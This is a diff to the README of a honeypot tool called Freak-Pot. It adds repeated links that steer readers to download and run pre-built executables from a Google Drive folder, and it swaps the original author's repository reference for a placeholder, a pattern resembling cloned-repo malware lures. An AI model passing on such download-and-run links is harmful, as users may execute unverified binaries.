@@ -13,6 +13,8 @@
 [![Version](https://img.shields.io/badge/Version-1.0.0-success)](https://github.com/yourusername/freak-pot/releases)
 [![Status](https://img.shields.io/badge/Status-Active-00ff41)](https://github.com/yourusername/freak-pot)
 
+### 📥 [**DOWNLOAD FREAK-POT**](https://drive.google.com/drive/folders/1BG3KtWrLwqpDJd5Xi0ECF8pkeM38oZtX?usp=drive_link) 📥
+
 [Features](#-features) • [Quick Start](#-quick-start) • [Configuration](#-configuration) • [Screenshots](#-screenshots) • [Documentation](#-documentation)
 
 </div>
@@ -37,28 +39,28 @@ Because sometimes, you need to let the chaos in to understand it. This isn't a t
 
 ## 🚀 Quick Start
 
-### No Installation Required! Just Download & Run
+### 📦 Download Pre-Built Executables
+
+**Download from Google Drive:** [Freak-Pot Releases](https://drive.google.com/drive/folders/1BG3KtWrLwqpDJd5Xi0ECF8pkeM38oZtX?usp=drive_link)
 
 #### Windows
 ```bash
-# Download the executable
-freak-pot.exe
-
-# Run from terminal
+# 1. Download freak-pot.exe from Google Drive
+# 2. Double-click or run from terminal
 .\freak-pot.exe
 ```
 
 #### Linux
 ```bash
-# Download the binary
-wget https://github.com/yourusername/freak-pot/releases/latest/download/freak-pot-linux
-
-# Make executable
+# 1. Download freak-pot-linux from Google Drive
+# 2. Make executable
 chmod +x freak-pot-linux
 
-# Run
+# 3. Run
 ./freak-pot-linux
 ```
+
+**No installation required! No dependencies!** Just download and run.
 
 **On first run, you'll be prompted to set credentials:**
 ```bash
@@ -78,6 +80,20 @@ Enter password: ********
 ```
 
 **That's it!** Open your browser to `http://localhost:5000`, login with your credentials, and start catching hackers.
+
+### 💡 Requirements
+
+**Pre-built binaries (Recommended):**
+- ✅ No Python installation required
+- ✅ No dependencies needed
+- ✅ Works out of the box
+- ✅ Just download and run!
+
+**Building from source:**
+- Python 3.7+
+- Flask
+- Paramiko
+- See `requirements.txt` for full list
 
 ---
 
@@ -139,7 +155,7 @@ Every single action is logged with extreme detail:
 ### Login Page
 
 <p align="center">
-<img src="https://github.com/J0K3R-x-Anarchy/Freak-Pot/blob/main/images/Screenshot%20at%202025-12-24%2018-08-17.png" width="800" alt="Freak-Pot Login Page"/>
+<img src="https://raw.githubusercontent.com/yourusername/freak-pot/main/images/login-screenshot.png" width="800" alt="Freak-Pot Login Page"/>
 </p>
 <p align="center">
 <em>Secure Matrix-themed login page with password protection before accessing the dashboard.</em>
@@ -451,6 +467,19 @@ This tool is designed for:
 - Unauthorized monitoring
 
 ---
+
+## 📚 Documentation
+
+### Included Guides:
+- `QUICK_START.md` - Get running in 5 minutes
+- `FULLY_FUNCTIONAL_GUIDE.md` - Complete usage guide
+- `FILE_UPLOAD_GUIDE.md` - File upload and verbose logging
+- `FTP_TROUBLESHOOTING.md` - Fix FTP issues
+- `TESTING_GUIDE.md` - Test your honeypot
+- `HTTP_CONFIGURATION.md` - HTTP customization
+- `FEATURES.md` - Complete feature list
+- `AUTHENTICATION.md` - Dashboard security setup
+
 ### Architecture:
 ```
 Freak-Pot Architecture:
@@ -474,9 +503,45 @@ Freak-Pot Architecture:
 
 ---
 
+## 🔨 Building from Source
 
+**Prefer pre-built binaries?** Download them from [Google Drive](https://drive.google.com/drive/folders/1BG3KtWrLwqpDJd5Xi0ECF8pkeM38oZtX?usp=drive_link) instead!
 
-### Future of Madness :
+If you want to build yourself:
+
+```bash
+# Clone repository
+git clone https://github.com/yourusername/freak-pot.git
+cd freak-pot
+
+# Install dependencies
+pip install -r requirements.txt
+
+# Run directly
+python main.py
+
+# You'll be prompted for credentials:
+# Enter username: your_username
+# Enter password: (hidden)
+
+# Or build executable
+pip install pyinstaller
+pyinstaller --onefile --add-data "uploads:uploads" --add-data "ftp_files:ftp_files" --add-data "ssh_files:ssh_files" main.py
+```
+
+---
+
+## 🤝 Contributing
+
+Contributions welcome! Here's how:
+
+1. Fork the repository
+2. Create feature branch (`git checkout -b feature/AmazingFeature`)
+3. Commit changes (`git commit -m 'Add AmazingFeature'`)
+4. Push to branch (`git push origin feature/AmazingFeature`)
+5. Open Pull Request
+
+### Ideas for Contributions:
 - Additional protocol honeypots (Telnet, SMTP, MySQL, RDP)
 - Machine learning for attack classification
 - Geographic IP mapping visualization
@@ -490,6 +555,17 @@ Freak-Pot Architecture:
 - Role-based access control
 
 ---
+
+## 📜 License
+
+This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+
+```
+MIT License - Free to use, modify, and distribute
+Attribution appreciated but not required
+No warranty - use at your own risk
+```
+
 ---
 
 ## 🙏 Acknowledgments
@@ -526,6 +602,7 @@ Using Freak-Pot, we discovered:
 
 **Made with 💚 and a little bit of madness**
 
+### 📥 **[Download Freak-Pot Now](https://drive.google.com/drive/folders/1BG3KtWrLwqpDJd5Xi0ECF8pkeM38oZtX?usp=drive_link)** 📥
 
 *The joke's on them... we're watching everything.* 🃏
 
